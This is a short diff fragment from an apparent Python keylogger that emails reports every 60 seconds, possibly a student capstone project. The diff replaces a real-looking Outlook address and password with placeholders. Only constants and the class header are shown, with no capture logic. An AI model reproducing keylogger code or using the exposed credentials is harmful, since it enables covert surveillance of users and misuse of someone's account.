@@ -8,8 +8,8 @@ from threading import Timer
 from datetime import datetime
 
 SEND_REPORT_EVERY = 60 
-EMAIL_ADDRESS = "mhcapstone22@outlook.com"
-EMAIL_PASSWORD = "Project22$"
+EMAIL_ADDRESS = "youremail@outlook.com"
+EMAIL_PASSWORD = "yourpasswordhere"
 
 
 class Keylogger:
